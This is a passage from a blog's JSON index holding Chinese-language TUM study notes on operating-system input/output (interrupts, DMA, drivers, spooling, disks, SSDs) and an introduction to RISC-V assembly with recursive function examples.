System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe 输入/输出","slug":"TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出","date":"2025-03-20T19:20:11.000Z","updated":"2025-04-01T21:47:24.340Z","comments":true,"path":"2025/03/20/TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出/","permalink":"https://archer-baiyi.github.io/2025/03/20/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"操作系统基础相关笔记","text":"设备大致可以分为2类： 块设备（Blockorientierte Geräte，block devices）： 内容是可寻址的（adressierbar）； 数据以固定大小的块存储（in Blöcken fester Größe von 29 Byte bis 216 Byte）； 可以随机访问（Random Access）每个块； 例子：蓝光光盘（Blu-ray Disc）、硬盘（HDD）、固态硬盘（SSD）。 字符设备（Zeichenorientierte Geräte，character device）： 串行数据传输（serieller Datentransfer）：指每次传输一个比特数据，并连续进行以上单次过程的通信方式； 不可寻址的； 发送和/或接收字符流（Zeichenströme）； 例子：鼠标，键盘，打印机。 （其他）： 比如说时钟（生成中断信号 erzeugt Unterbrechungen），显示器等。 拿键盘举例，我们每次敲击按键了之后它都会将这个信息直接传输到电脑，而不是等我们输入了一长串内容之后再将这段内容一起发送给电脑，所以是serieller Datentransfer。而与serieller Datentransfer相对的则是parallele Datenübertragung。 E/A System 的分层结构： 控制器（Controller）：设备硬件的一部分；作为CPU和设备之间的接口。 中断处理程序（Interrupt-Handler）：处理设备的反馈信息（中断）。 设备驱动程序（Gerätetreiber）：执行与设备相关的控制软件；驱动程序通过控制器访问设备。 设备无关软件（Geräteunabhängige Software）：分配设备、数据缓冲等功能。 用户级软件（User-Level-Software）：用于输入/输出（E/A）的库函数，例如假脱机（Spooling）。 以惠普（HP）打印机为例来明确一下每层的具体内容： 控制器：HP 打印机的主控制芯片 惠普打印机内部有专门的 控制芯片，负责管理打印作业、处理数据，并控制墨盒或激光成像单元的工作。 中断处理程序：负责处理打印机状态反馈（如“缺纸”或“墨盒不足”）的程序 当打印机遇到 缺纸、卡纸、墨水不足 等问题时，会发送中断信号给计算机，让操作系统暂停当前任务并处理异常。 设备驱动程序：HP 打印机驱动程序 点击“打印”时，驱动程序会把文本或图像转换成 HP 打印机能理解的格式（如 PCL、PostScript），然后发送给打印机。 设备无关软件：Windows/Linux 的打印管理系统 这层软件不依赖于具体的打印机品牌，而是为所有打印设备提供统一的管理功能，如： 排队管理（多个打印任务排队执行） 数据缓冲（避免 CPU 直接等待打印机完成任务，提高效率） 用户级软件：用户直接使用的应用程序，它们调用系统级打印服务完成任务。例如：Microsoft Word，HP Smart App。 接下来我们看一下每一层的具体功能： 控制器（Controller）什么是控制器？ 输入/输出设备（E/A-Geräte） 由机械组件和电子组件组成，其中电子组件就是设设备控制器（Geräte-Controller）。它是连接 CPU 和外部设备的桥梁。 Controller besitzt Hardware-Schnittstelle zum Gerät. 控制器包含寄存器（Register），用于与 CPU 进行通信： 数据传输：操作系统（BS）向寄存器写入数据。 查询设备状态：操作系统 读取寄存器内容。 附加功能：控制器提供数据缓冲区（Datenpuffer），用于存储传输中的数据，以提高效率。 设备控制器（Geräte-Controller）的主要任务： 设备管理（Steuerung der beweglichen Hardware） 处理来自驱动的命令（Befehle ausführen） 与CPU进行交互（Kommunikation mit CPU） 发送中断信号（Interrupts melden） 缓冲数据（Daten puffern） 交互计算机与设备控制器（Controller）交互主要有两种方式： I/O-Ports： 早期计算机使用 I/O 指令和I/O 端口与设备通信。 Memory-Mapped I/O： 将设备的寄存器直接映射到系统内存地址空间，这样 CPU 可以通过普通的 LOAD/STORE 指令来访问设备。 早期的计算机需要手动设置设备地址，使用 跳线（Jumper） 或 DIP 开关。而现代设备支持 Plug &amp; Play，系统能够自动分配 I/O 端口地址 和 中断（IRQ）。 数据交换第一种方法： 程序控制 I/O（Programmed I/O）CPU会直接控制与设备的交互。 比如说向打印机发送数据需要进行以下步骤： 将数据复制到内核 内核逐个字符发送到打印机 传输字符 $N$ 等待打印机确认字符 $N$ 继续发送字符 $N+1$ 这样做的坏处非常显而易见：忙等待（Busy Waiting）。CPU会被卡死在这里不能完成其他的任务。 代码示例： 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // 忙等待 *printer_data_register = p[i]; // 只发送一个字符&#125; 更好的办法： 中断（Interrupts）流程如下： 设备通过信号通知CPU，表明其I/O操作已完成。 中断控制器（Interrupt Controller Chip）识别信号，并通知CPU。 操作系统（BS）暂停当前进程，切换到内核模式（Kernel Mode）。 在内核中执行中断处理程序（Unterbrechungsbehandlungsroutine） 设备驱动程序（Gerätetreiber）负责提供中断处理程序（Unterbrechungsbehandlungsroutine），但中断处理的执行由操作系统管理。 中断处理程序（Handler） 执行完成后便会通知操作系统。 操作系统将等待（wartenden）I/O 的进程恢复到可运行状态（rechenwillig）。 这个流程可以分为2部分： 同步系统调用（Systemcall） 传递 I/O 参数，启动 I/O 操作。 调用后，进程进入睡眠状态（等待 I/O 完成），释放 CPU。 Interrupt-Handler 逐步处理 I/O 操作。 I/O 完成后，唤醒等待的进程。 代码示例： 1. Systemcall： 12345copy_from_user(buffer, p, count); // 从用户空间复制数据到内核enable_interrupts(); // 允许中断while (*printer_status_reg != READY); // 轮询等待打印机准备就绪*printer_data_register = p[0]; // 发送第一个字符到打印机scheduler(); // 调度其他进程 2. Interrupt-Handler： 123456789if (count == 0) &#123; unblock_user(); // 唤醒等待的进程&#125; else &#123; *printer_data_register = p[i]; // 发送下一个字符 count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // 确认中断已处理return_from_interrupt(); 用这个方法的话CPU 可在 I/O 期间执行其他任务，不需要一直等待。但是会一直触发Interrupt，可能会影响性能。 所以此之上还有一种更好的办法： 直接内存访问（Direct Memory Access, DMA）使用 DMA 控制器，允许直接访问内存，而无需 CPU 介入。可以有效解决通过寄存器作为中间存储器传输数据消耗大量 CPU 计算周期的问题。 传输流程： CPU 初始化 DMA （Programmiert DMA-Register (Speicher- und Gerätadressen, Parameter)）； 磁盘控制器（ Disk-Controller）将数据放入缓冲区（Puffer）； DMA 控制器从磁盘（Disk）读取数据，并直接存入主存（RAM）（DMA-Controller initiiert die Übertragung von Disk in RAM）； 磁盘控制器（ Disk-Controller）发送确认（ACK）。 操作系统（BS）继续处理内存中的数据（ weiterverarbeiten bzw. weitergeben） 流程结束之后才会发送Interrupt。 之前是传输每个数据（每个字符）都会触发一次Interrupt，现在是传输整个数据块只会触发一次。 数据缓冲（Puffern von Daten）缓冲的主要作用是解耦（Entkopplung）用户程序和设备。相当于提供一个中间层。 （解耦指的是减少两个系统组件之间的直接依赖关系。） 缓存分以下几种类型： 无缓冲（Ohne Puffer）： 用户进程必须自己存储 I/O 数据，并且数据必须始终驻留在进程的内存中，直到 I/O 操作完成。 简单缓冲（Einfacher Puffer）： 进程仍然必须快速取走数据，否则缓冲区会满，影响数据流。 双缓冲（Doppelter Puffer）： 一个缓冲区正在被读取（geleert）的同时另一个缓冲区会正在被写入（gefüllt）。清空速度必须足够快，否则会导致数据堆积。 环形缓冲（Zirkulär / Ringpuffer）： 扩展双缓冲的概念，使用多个缓冲区（k 个缓冲区）。可以适应不同的负载和处理速度，提高数据吞吐率。 会使用2个指针来管理数据：写指针和读指针。 有时可能会存在多个级别的缓冲，比如说：Nutzerprozess, Kern, Gerätetreiber, Gerätecontroller, … 设备驱动程序（Geräte-Treiber）设备驱动程序（Geräte-Treiber，Device Driver） 是操作系统中用于控制硬件设备的软件模块（Software-Module）。它充当 BS 和设备（尤其是Controller）之间的桥梁，让系统能够识别和管理外部设备。 驱动具有以下特点： 针对特定设备类型（Gerätetyp-spezifisch） 它了解相应设备的指令集（即控制设备的命令），以便和controller进行交互。 一个驱动程序可适用于多个同类设备 比如说USB驱动会支持所有的USB设备。 驱动充当BS 和设备（尤其是Controller）之间的桥梁指的是它可以： 查询设备状态（Gerätezustand abfragen） 向设备发送命令（Befehle an das Gerät zu übermitteln） 与设备进行数据交换（Daten mit dem Gerät auszutauschen） 同样，驱动也可能存在子结构（Unterstruktur），比如说USB。 驱动的主要任务： 定义设备并向操作系统注册，并激活设备。（definiert das Gerät gegenüber dem BS, aktiviert das Gerät） 在系统启动时初始化控制器和设备。（initialisiert den Controller und das Gerät beim Systemstart） 转换I/O 请求，使其变为设备可理解的指令。（wandelt E/A-Anforderungen in gerätespezifische Befehle um） 响应（来自设备或控制器的）硬件信号。（antwortet auf Hardwaresignale des Geräts bzw. des Controllers）（比如说 Interrupt handling） 报告设备和控制器的错误（错误检测和日志记录）。（meldet Geräte- und Controller-Fehler） 传输设备与操作系统之间的数据和状态信息。（überträgt Daten und Zustandsinformation vom/zum Gerät） 缓冲输入/输出数据，优化数据传输性能。（提供Buffer）（puffert Daten bei Ein- und Ausgabe） 设备驱动是如何与设备控制器协作的？ 驱动程序发送命令到设备控制器，并在等待期间阻塞自身（防止 CPU 过度轮询）。（Treiber schickt Kommandos zum Controller und blockiert sich） 控制器处理数据并在传输完成后发送信号（通知数据交换已完成）。（Controller signalisiert das Ende des Datenaustausches） 中断处理程序（Interrupt-Handler）解除驱动的阻塞状态，例如通过信号量（Semaphore） 让进程恢复运行。（Der Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)） 驱动程序处理收到的数据或继续发送新数据。（Treiber verarbeitet empfangene Daten bzw. schickt weitere Daten） 设备无关的软件（Geräte-unabhängige Software）设备无关的软件的目的是简化驱动程序的编程（Vereinfachte Treiber-Programmierung），并便于集成新的驱动程序软件（Einfache Einbindung neuer Treiber-Software）。 设备无关软件的主要任务： 在设备驱动程序和操作系统之间建立标准接口。（Bereitstellung einer einheitlichen Schnittstelle zwischen Gerätetreibern und dem Rest des Betriebssystems） 缓冲 如果缓冲不由驱动管理，则由设备无关的软件负责。 错误处理（Fehlerbehandlung） 除了驱动程序本身的错误处理外，还提供额外的错误管理机制。 设置设备无关的参数（Festlegung geräteunabhängiger Parameter） 比如说块设备（Blockgerät）使用的块大小（Blockgröße） 用户级软件（User-Level-Software）系统库（Systembibliothek）通常会直接给用户提供E/A的编程接口。 比如说： open()： 打开设备的逻辑通道，返回一个 文件描述符（Descriptor 或 Handle），供后续操作使用。 read()： 从设备读取数据，返回指定数量的字节流（Bytestream）。 close()： 关闭先前打开的通道，释放相关的系统资源。 write()： 向设备写入数据，发送指定数量的字节到设备。 ioctl()： 改变设备的操作模式，比如调整串行端口的传输速率或者是修改设备的控制参数 除了这些标准库函数，还有： 假脱机（Spooling）由于在现实生活中，我们经常会有多个进程同时提交I/O请求，比如说用一台打印机打印多份文件。这个时候就需要想办法协调资源的使用，避免出现冲突。 什么是 Spooling？ Spooling（Simultaneous Peripheral Operations Online，同步外设操作） 是一种用于管理独占（）exklusiv nutzbar)设备（如打印机）访问的缓冲机制。 在这个机制下，进程不会直接访问设备，而是将任务交给 Spooler Daemon（假脱机守护进程） 处理。只有 Spooler Daemon 会直接与设备驱动程序交互，确保设备顺序执行任务。用户进程的任务先存入 Spooling 目录（缓冲区），然后按顺序执行。 UNIX/Linux里的设备管理在UNIX/Linux里，我们需要通过文件系统访问 I/O 设备（因为“Everything is a file”）： 在访问设备前，必须先打开它 open。 不同设备支持额外的文件系统操作，如读写、状态查询等。 设备管理位于 /dev 目录，所有设备文件都存放在这里。 设备状态查询和配置可能位于 /proc 目录。 设备文件名称指示设备类型，比如说： /dev/tty0：物理串行接口（终端）。 /dev/USBtty1：抽象串行接口（USB 串口设备）。 /dev/sd0：硬盘设备（sd 代表 SCSI 磁盘）。 /dev/null：伪设备，写入的数据会被丢弃。 /dev/zero：伪设备，读取时返回无限的 0 字节。 Spooling 任务存储在 /var/spool 目录下，其中 lpq：打印任务队列（打印机 Spooling）。 mqueue：邮件服务器的发送队列（邮件 Spooling）。 news：新闻系统消息队列（新闻 Spooling）。 cron：定时任务执行队列（任务调度 Spooling）。 而设备的真正标识存储在 i-Node 中。i-Node会包含： 主设备号（Major Device Number）：标识设备驱动程序（决定设备的驱动）。 次设备号（Minor Device Number）：要访问的具体设备。 设备例子（机械）硬盘（Festplatten，HDD）机械硬盘属于Block-Gerät，有着以下构造： 同心圆柱（Konzentrische Zylinder） 堆叠的磁盘盘片（Platten, k 层），每张盘片的两面都可以读写（2k 面）。 每张盘片上有多个磁道（Tracks），磁道的编号取决于 圆柱、盘片和面（Track = f(Zylinder, Platte, Seite)）。 每个磁道由多个扇区（Sektoren）组成，每个扇区大小为 512 字节。不过靠近磁盘中心的区域可能有更少的扇区（由于圆周较小）。 机械读写磁头（Schreib-/Leseköpfe），每个盘片有两个读写磁头（上下各一个），总数为 2k。 构造图示： 早期会用到3个参数来确定需要读写的具体位置： x Zylindernummer，Radius：确定是哪一个环； y Kopfnummer，Höhe：确定是哪一张盘片的哪一面； z Sektornummer pro Winkel：确定是哪个扇面； 由于早期 BIOS 和文件系统的设计的限制，只能访问有限的区域。 所以现在一般都使用线性逻辑地址（lineare Adressierung logischer Blöcke），即给每个Sector编号（0，1，2，3，…）。 一个Sector里会包含以下信息： 前导信息（Präambel）： 包含同步位、磁道号和扇区号 数据（Daten）： 通常为512字节 错误校正码（ECC）： Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. 控制器通常一次读取整个磁道，这会需要足够的缓存来存储数据。但假如没有足够的缓存，则会采用交错的格式（ Formatierung mit Interleaving）：扇区不会按顺序排列的：1, 2, 3, 4, 5, 6, …, 15，而是交错排列的：1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15。这样子可以确保读取某个扇区 N ，将数据传输到主存后，扇区 N+1 会刚好移动到读写头下方，不需要再多等一圈。（因为磁盘好像是会一直转的） 为了避免磁盘损坏影响硬盘功能，会使用RAIS-System。（详细内容见数据库的笔记） 读写磁头找到所需Sector的策略分3种： FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) 固态硬盘（SSD）SSD的全称为Solid State Drives，主要基于 (NAND) 闪存。 SSD的一些特点： 无机械部件（Keine beweglichen Teile） 所以不会有机械磨损及其导致的故障，更耐振动、冲击等，访问速度更快。 仍然可能出现故障（Fehlfunktionen auch hier möglich），比如 坏块，存储芯片故障（Bad blocks, Fehler in Speicherchips） 反复读取可能影响相邻存储单元 故障可能导致整个 SSD 无法读取 数据恢复更加复杂 闪存写入次数有限（Flash-Speicher nur begrenzt oft schreibbar） 读取比写入快，顺序（sequentiell）写入比随机写入快 SSD的基本工作原理SSD的初始状态是： 111111111 11111111 11111111 ... 写入的话会将1改成0： 101000111 01000010 01010011 ... 但如果想修改的话，不能只是修改一位，而是需要将这一整块重置然后再写入。 写入的大小最低为4KB，删除的大小最低为256KB，所以会导致所谓的写入放大（Write Amplification）的问题。 解决方式：这部分我没看懂，等看懂了再写。 时钟（Uhr,）时钟会持续性计时。 硬件时钟（Hardware-Uhr (Chip)）的构成： Quarz als Taktgeber： 石英晶体”作为时钟信号源，用来产生稳定的振荡信号（周期性电信号）作为“节拍”。 计数器（Zähler）： 每个时钟节拍到来时，计数器的值会减1（dekrementiert）； 当计数器值减到0时，就会触发一个中断（Interrupt）。 Register zum (wiederholten) Setzen des Zählers auf einen Startwert： 可以通过软件来控制Interrupt的频率。 时钟/定时器的任务： 管理时间和日期（Tageszeit und Datum verwalten） 中断和切换进程（调度）（Prozesse unterbrechen und umschalten (Scheduling)） 测量某个进程的计算时间消耗（Rechenzeitverbrauch eines Prozesses messen） 向应用程序提供定时器功能（ Zeitschaltuhren den Anwendungen zur Verfügung stellen） 功能监控（看门狗定时器）（Funktionsfähigkeitsüberwachung (watchdog timer)） 性能分析、监控、统计（Profiling, Monitoring, Statistik） 可以用链表的数据结构来管理定时事件： 所有时间均为相对时间（relativen Zeiten），也就是说每个节点的值代表相对于前一个事件的延迟（以 tick 为单位）。 定时器（Timer）Timer（定时器）确实通常分为两种类型： 硬件定时器（Hardware Timer）： 系统通常有第二个可编程定时器。它在到时间的时候会触发Interrupt。但Interrupt的代价有点高，因为会引发上下文切换，并且可能会干扰程序正常运行。 软件定时器（Software Timer）： 这个的想法是只在系统处于内核态时检查定时器状态（nur dann aktiv werden, wenn System im Kernel-Mode ist），这样一来就不需要额外的上下文切换。在从内核模式切换到用户模式之前，操作系统读取实时时钟并检查是否有软件定时器已经超时，如有需要，处理相应的事件。 它的缺点也很明显，就是延迟，不过大部分情况下都是可以接受的。 终端（Terminals）终端是如何通过驱动程序将用户输入/输出转化为系统能够理解的数据流的： 上层：提供一个统一接口给操作系统的输入/输出子系统（Einheitliche Schnittstelle zum E/A-Subsystem des BS） 中层：解析输入和构造输出内容（Bearbeitungsmodul für Ein- und Ausgaben） 下层：与不同的物理硬件设备直接对应（Abbildung verschiedene physische Geräte），比如鼠标、显卡。 系统中的 terminal 是一个底层的字符设备机制，管理输入输出流、进程控制和驱动之间的协作。而我们平常用的cmd只是是 terminal的一种表现形式。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V 汇编语言入门","slug":"TUM笔记/ERA/RISC-V-汇编语言入门","date":"2025-03-19T19:56:10.000Z","updated":"2025-04-01T21:50:08.597Z","comments":true,"path":"2025/03/19/TUM笔记/ERA/RISC-V-汇编语言入门/","permalink":"https://archer-baiyi.github.io/2025/03/19/TUM%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"计算机体系结构基础相关笔记","text":"[toc] RISC-V 寄存器在 RISC-V 中，所有操作数（Operanden）都存储在寄存器中。 RISC-V ISA 拥有 32 或 33 个（可见）寄存器，其中x0永远为零，而x1 到 x31 是通用整数寄存器，f1 到 f31 是 浮点寄存器： Register ABI Name Description Saver x0 zero Hard-wired zero — x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer — x4 tp Thread pointer — x5–7 t0–2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10–11 a0–1 Function arguments/return values Caller x12–17 a2–7 Function arguments Caller x18–27 s2–11 Saved registers Callee x28–31 t3–6 Temporaries Caller Register ABI Name Description Saver f0–7 ft0–7 FP temporaries Caller f8–9 fs0–1 FP saved registers Callee f10–11 fa0–1 FP arguments/return values Caller f12–17 fa2–7 FP arguments Caller f18–27 fs2–11 FP saved registers Callee f28–31 ft8–11 FP temporaries Caller 这里第一列的是每个寄存器的编号，而第二列则是附带语义的名字。一般在汇编代码中使用ABI name，便于理解和维护。 关于Saver部分可以看下面这个表，会更直观一点： Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No Caller指的是调用函数的一方（比如说main()），而Callee指的则是被调用的函数。 如果一个register的Saver是Caller，则调用函数的一方（Caller）需要在调用函数前将这些寄存器里的值都存储好，以便被调用函数可以随意使用； 如果一个register的Saver是Callee，则被调用函数需要确保这些寄存器的值在该函数结束后与之前一模一样。 通俗一点来讲，前者是将自己的笔记本备份好之后借出去，借用方（Callee）可以随意使用；后者则是将笔记本借出去，但借用方必须确保拿到的时候是什么样子的还回去的时候也得是什么样子的。 RISC-V 汇编语言每一个ISA（Instruction Set Architecture）的指令都可以分为以下3大类： 算术和逻辑运算（Arithmetische und logische Operationen） 数据传输（Datentransfer） 程序控制 （Steuerung des Programmablaufs）：跳转和子程序调用（ Sprünge und Unterprogrammaufrufe） RISC-V 汇编指令一览： 算术 Arithmetik加法： a = b + c 1add a,b,c 减法： a = b - c 1sub a,b,c 组合： a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d 浮点数的情况： “f” 用于 Single Precision (32bit) Gleitkomma； “d” 用于 Double Precision (64bit) Gleitkomma。 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c 乘法的话基本上就是以下几种： 只不过RISC-V 的基本整数指令集中（RV32I 和 RV64I）不包含 mul 指令，乘法运算通常需要 M 扩展（RV32M/RV64M）。如果只允许使用 RV32I/RV64I 指令，则必须通过移位和加法手动实现乘法。 在硬件实现上，移位操作比乘法更快，因为移位仅涉及逻辑电路，而乘法通常需要额外的计算资源。 例子： 假设 $s1 = 0x40000000 = 2^{30}$ $ s2 = 0x80000000 = -2^{31}$ $ s1 * s2 = -2^{61} = 0xE0000000 00000000$ 那么 123mul s3, s1, s2mulh s4, s1, s2# &#123;s4,s3&#125; = s1 * s2 便会得到 $ s4 = 0xE0000000; s3 = 0x00000000$ 除法以及余数： 逻辑运算 Logische Operation和： a = b AND c 1and a,b,c 或： 1or a,b,c 异或： 1xor a,b,c 移位（Shifts）： 移位操作分为2种： 1. 逻辑移位 logischer Shift ，用 &gt;&gt;, &lt;&lt;表示 用 0 填充空出的高位，无论原数是正数还是负数(Null Bits nachgeführt)，适用于 无符号数（unsigned numbers） 计算。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1srl t0, t0, 4 会得到 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454（正数） 例子2： 假设 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25（十进制） 那么经过 1sll t0, t0, 4 会得到 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400（正数） （$400 = 25 * 2^4$） 2. 算术移位 arithmetischen Shift，用 &gt;&gt;&gt;, &lt;&lt;&lt; 表示 会保持符号位（MSB）不变 (erhält Vorzeichen, 0 oder 1 nachgeführt) 如果是正数（MSB = 0），则用 0 填充高位。 如果是负数（MSB = 1），则用 1 填充高位。 适用于 有符号数（signed numbers） 计算，保持符号正确。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1sra t0, t0, 4 会得到 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (负数) 左移本质上就是乘法。无论有符号数还是无符号数，左移的行为都是相同的，所以 RISC-V 没有 sla指令。 这里的 uimm 会被限制在 5-bit 的无符号整数。 数据传输（Datentransfer）读取（Lesen vom Speicher）： ld (load word) Format： 1ld destination, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 写入（Schreiben in den Speicher）： sd (store word) Format： 1sd source, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 跳转 Sprung无条件跳转： 12j immjr reg, imm 第一个会跳转到PC = PC + imm 第一个会跳转到PC = reg + imm 有条件跳转： 格式： 1bxx r1,r2,imm bxx的可选选项： branch if equal (beq)：$r1 = r2$ branch if not equal (bne)：$r1 \\neq r2$ branch if less than (blt)：$r1 &lt; r2$ branch if greater than or equal (bge)：$r1 \\leq r2$ 例子1（if）： 123if (i == j)&#123; f = g + h;&#125;f = f – i; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 例子2（if, else）： 1234if (i == j)&#123; f = g + h;&#125;else&#123; f = f - i;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: 例子2（while 循环）： 12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) &#123;pow = pow * 2;x = x + 1;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: 子程序调用 UnterprogrammeBegriffe： Caller（调用者）：调用函数的代码（如 main()）。 Callee（被调用者）：被调用的函数（如 simple()）。 12jal reg, offset #调用jr ra #返回 例子： 12345678int main() &#123; simple(); a = b + c;&#125;void simple() &#123;return;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return 其他的伪命令： 1mv ra, rb 跟 12add ra,rb,x0addi ra,rb,x0 等价。 递归（Rekursion）普通递归例子1：阶乘 1234int factorial(int n) &#123; if (n == 0) return 1; return n * factorial(n - 1); // （递归调用后还有乘法,所以是非尾递归）&#125; 对应的RISC-V（n=4的情况示例）： 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4，计算 4 的阶乘（作为输入参数）0x204 jal ra, magic # 跳转调用 magic 函数（递归实现阶乘），返回地址存入 ra0x208 ebreak # 程序断点（模拟器中用于停止执行） magic:0x20c beq a0, zero, break # 如果 a0 == 0，跳转到 break（0! = 1）0x210 addi sp, sp, -8 # 分配栈空间：只保存 ra 和 a0，所以是2*4=8Bits0x214 sw ra, 0(sp) # 保存返回地址 ra 到栈顶0x218 sw a0, 4(sp) # 保存当前参数 a0（n）0x21c addi a0, a0, -1 # a0 = a0 - 1，准备递归调用 magic(n-1)0x220 jal ra, magic # 递归调用 magic(n-1)，返回值仍存在 a0 中0x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） break:0x238 addi a0, zero, 1 # a0 = 1，返回 1（0! = 1）0x23c jalr zero, 0(ra) # 返回调用者 由于每次计算 factorial(n) 的值时需要先等 factorial(n-1)的计算结果先出来，所以等待期间需要将所有的 n 都给存在stack里，也就是说： 123456789101112factorial(4) → 需要等factorial(3) 的结果 → 需要等 factorial(2) 的结果 → 需要等 factorial(1) 的结果 → 需要等 factorial(0) 的结果 → 返回 1然后开始回溯计算：factorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 而栈结构如下： 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ 返回的时候则是这样：当a0=0的时候触发0x20c的beq，跳转到break，break执行完了会跳转到当前的ra（也就是stack最底下一行的0x224），然后进行这部分操作： 123450x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） 计算a0 = 1*1然后继续跳转到stack倒数第三行的0x224，重复下去知道跳转到0x208，触发断点。 例子2：最大公约数 12345678unsigned ggT(unsigned a, unsigned b) &#123; if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);&#125; 对应的RISC-V： 1234567891011121314151617181920ggT: beq a0, a1, finished # 如果 a0 == a1，则跳转到 finished（返回结果） bltu a0, a1, lt # 如果 a0 &lt; a1，则跳转到 lt 标签（交换顺序） sub a0, a0, a1 # 否则 a0 &gt; a1，执行 a0 = a0 - a1 j cont # 跳转到 cont，准备递归调用lt: sub a1, a1, a0 # 执行 b = b - a （即 a1 = a1 - a0）cont: addi sp, sp, -16 # 为返回地址创建栈空间（递归调用前保存返回地址） sw ra, 0(sp) # 保存返回地址 jal ra, ggT # 递归调用 ggT（jump and link） lw ra, 0(sp) # 恢复返回地址 addi sp, sp, 16 # 回收栈空间 jalr zero, 0(ra) # 返回（跳转回上层调用） finished: jalr zero, 0(ra) # 返回当前的 a0 作为结果 总结一下： 每个Recursive的函数递归部分会分成2部分： 从当前n的情况跳转到n-1，保存当前n的值以及返回地址（即当前跳转命令的下一行的地址） 读取返回地址并用当前已经计算出来的n-1的情况的值与n进行函数运算。 相当于递减完了之后还得递增回来。 